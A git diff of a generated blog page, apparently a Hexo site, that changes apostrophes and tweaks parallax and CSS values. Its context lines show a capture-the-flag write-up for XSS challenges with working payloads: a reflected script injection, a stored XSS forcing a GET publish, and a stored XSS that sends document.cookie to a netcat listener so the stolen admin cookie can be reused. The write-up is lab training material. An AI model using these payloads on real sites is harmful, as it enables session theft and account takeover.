@@ -477,11 +477,11 @@ first:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="xss-5---stored-xss-csrf-get-publish">xss 5 - stored XSS + CSRF
 (GET publish)</h2>
-<p>admin’s unpublished draft contains the flag. published posts render
+<p>admin's unpublished draft contains the flag. published posts render
 raw HTML. <code>/publish</code> is <strong>GET</strong>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br></pre></td></tr></table></figure>
-<p>login as hacker, store XSS that makes admin’s browser call
-<code>/publish</code>, which publishes admin’s flag draft:</p>
+<p>login as hacker, store XSS that makes admin's browser call
+<code>/publish</code>, which publishes admin's flag draft:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="xss-6---stored-xss-csrf-post-publish">xss 6 - stored XSS + CSRF
 (POST publish)</h2>
@@ -499,7 +499,7 @@ flask.session)</li>
 <li>drafts are visible to their own author</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(<span class="string">&quot;auth&quot;</span>, username + <span class="string">&quot;|&quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin blocked</span></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    flask.abort(<span class="number">400</span>, <span class="string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># drafts visible to author</span></span><br><span class="line"><span class="keyword">elif</span> post[<span class="string">&quot;author&quot;</span>] == username:</span><br><span class="line">    page += <span class="string">&quot;&lt;b&gt;YOUR DRAFT POST:&lt;/b&gt; &quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br></pre></td></tr></table></figure>
-<p>since admin can’t publish, steal the cookie instead and log in as
+<p>since admin can't publish, steal the cookie instead and log in as
 admin to view the draft:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. login as hacker, store XSS that exfiltrates document.cookie</span></span><br><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;http://localhost:1337/&#x27;, &#123;method: &#x27;POST&#x27;, body: document.cookie&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. listen for stolen cookie</span></span><br><span class="line">nc -l -p 1337 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. trigger victim (admin) to visit the page</span></span><br><span class="line">/challenge/victim</span><br><span class="line"><span class="comment"># received: auth=admin|RT.dJDO1YDL4cjM1gzW&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. use stolen cookie to view as admin</span></span><br><span class="line">curl --cookie <span class="string">&quot;auth=admin|RT.dJDO1YDL4cjM1gzW&#125;&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -653,8 +653,8 @@ admin to view the draft:</p>
     let observer = null;
     let rafId = null;
 
-    const parallaxFactor = 0.1; // 提升移动幅度
-    const lerpFactor = 0.3; // 提升响应灵敏度
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
     let currentY = 0; // 渲染位置
     let targetY = 0; // 目标位置
     let isUpdating = false; // 正在执行内容更新锁
@@ -769,7 +769,7 @@ admin to view the draft:</p>
     transform: translateX(-50%);
     font-size: 10vw;
     font-weight: 900;
-    color: rgba(255, 255, 255, 0.035);
+    color: rgba(255, 255, 255, 0.05);
     text-transform: uppercase;
     white-space: nowrap;
     pointer-events: none;
@@ -777,7 +777,7 @@ admin to view the draft:</p>
     user-select: none;
     font-family: "Roboto Mono", monospace;
     letter-spacing: -2px;
-    filter: blur(5px);
+    filter: blur(1.2px);
     opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
     transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
     will-change: transform, opacity;
